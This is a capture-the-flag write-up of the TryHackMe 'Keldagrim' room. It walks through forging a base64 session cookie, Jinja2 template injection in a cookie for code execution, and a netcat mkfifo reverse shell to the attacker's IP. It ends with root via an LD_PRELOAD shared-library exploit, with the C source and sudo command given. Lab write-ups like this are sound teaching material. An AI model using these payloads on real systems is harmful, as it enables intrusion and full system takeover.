---
title: "TryHackMe - Keldagrim"
author: Nasrallah
description: ""
date: 2023-01-05 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, medium, LD_PRELOAD, ssti, sudo]
img_path: /assets/img/tryhackme/keldagrim
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Keldagrim](https://tryhackme.com/room/keldagrim) from [TryHackMe](https://tryhackme.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.46.185
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d8:23:24:3c:6e:3f:5b:b0:ec:42:e4:ce:71:2f:1e:52 (RSA)
|   256 c6:75:e5:10:b4:0a:51:83:3e:55:b4:f6:03:b5:0b:7a (ECDSA)
|_  256 4c:51:80:db:31:4c:6a:be:bf:9b:48:b5:d4:d6:ff:7c (ED25519)
80/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
|_http-title:  Home page 
| http-cookie-flags: 
|   /: 
|     session: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

There are two open ports, 22 running OpenSSH and 80 running Werkzeug http webserver with python.

## Web

Let's navigate to the web server.

![](1.png)

This is a gold selling website for video games.

The `buy gold` tab on the website has an interesting page.

![](2.png)

Let's check the admin page.

![](3.png)

Not very different from the first page, maybe we need to have permission to view the page.

Let's check if there are any cookies.

![](4.png)

We found a cookie called `session` with a value that looks like a base64. Let's decode it.

![](5.png)

It's a base64 encoding of `guest`.

Let's try changing `session` value to admin.

![](6.png)

We base64 encode `admin` and change to cookie's value and refresh the admin page.

![](7.png)

We got a different page this time, on the page we see current user with $2,165.

Let's check the the cookies again.

![](8.png)

There is another cookie now called `sales` with once again a base64 encoded string. Let's decode it.

![](9.png)

It's the same amount of money we saw on the admin page.

Let's change it to see if the website returns what's on the cookie.

![](10.png)

We replace the value of `sales` with the new one and refresh the page.

![](11.png)

It did.


# **Foothold**

Since this website uses python, i tried to do a server side template injection.

With the help of [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2), let's see if the site is vulnerable to SSTI.

![](12.png)

The payload we'll be using for testing is `\{\{7*'7'\}\}` , let's base64 encode it.

![](13.png)

Now we put as `sales` value and refresh the page, if we got 7777777 back the website is vulnerable.

![](14.png)

We confirmed the site is vulnerable, now let's search for some remote code execution [payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-ospopenread).

![](15.png)

Let's use the following payload.

```python
\{\{ self.\_TemplateReference\_\_context.cycler.\_\_init\_\_.\_\_globals\_\_.os.popen('id').read() \}\}
```

![](16.png)

Let's relace the new cookie with the new one and refresh the page.

![](17.png)

Great! We got rce.

Now let's get a reverse shell with the help of [revshell.com](https://www.revshells.com/).

![](18.png)

Will be using nc mkfifo payload.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.11.14.124 9001 >/tmp/f
```

Let's add this the the first rce payload.

```python
\{\{ self.\_TemplateReference\_\_context.cycler.\_\_init\_\_.\_\_globals\_\_.os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.11.14.124 9001 >/tmp/f').read() \}\}
```
Let's base64 encode the payload, change the cookie value, setup a listener and then refresh the page.

![](19.png)

We got the reverse shell and used python pty to stabilize it.


# **Privilege Escalation**

Let's check out current privileges.

![](20.png)

We can run /bin/ps as root, but we also see that LD_PRELOAD is added to env_keep, this mean that we can specify a shared library to run before the program is executed.

To exploit this, we need to write the following c program.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

```

We save the code above in a file with the extension `.c` at the end; `exp.c` for example.

now we need to compile it using the following command:

```bash
gcc exploit.c -o exploit -fPIC -shared -nostartfiles -w
```

Now we execute `ps` as root and specify the `exploit` as the library we want to run before the program.

```bash
sudo LD_PRELOAD=/home/jed/exploit /bin/ps
```

![](21.png)

Congratulations, we got root.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

# References
